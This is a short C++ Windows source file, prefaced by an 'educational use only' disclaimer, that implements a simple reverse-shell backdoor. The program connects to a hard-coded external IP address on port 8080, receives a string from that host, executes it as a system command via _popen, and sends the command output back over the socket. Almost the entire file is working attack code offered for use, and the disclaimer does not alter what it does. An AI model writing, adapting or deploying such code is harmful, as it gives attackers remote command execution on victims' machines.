/*
 * EDUCATIONAL USE ONLY — DO NOT USE ILLEGALLY
 *
 * This code is provided for learning and testing in controlled environments only.
 * Do NOT use it to access, control, or damage systems or data you do not own
 * or do not have explicit written permission to test.
 *
 * Unauthorized or illegal use is prohibited — you are solely responsible for
 * any consequences. This is not legal advice.
 */
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib>
using namespace std;

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    cout << "test3";
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    inet_pton(AF_INET, "31.187.78.16", &serverAddr.sin_addr);

    connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));

    char buffer[1024];
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer)-1, 0);
    if (bytesReceived > 0) {
        buffer[bytesReceived] = '\0';
        if (strlen(buffer)> 0)
        {
            FILE* pipe = _popen(buffer, "r");
            if (pipe)
            {
                char buf[256];
                while (fgets(buf, sizeof(buf), pipe))
                {
                    send(clientSocket, buf, strlen(buf), 0);
                }
                _pclose(pipe);
            }
            // ✅ close connection after sending output
            closesocket(clientSocket);
        }
    }
    WSACleanup();
    return 0;
}
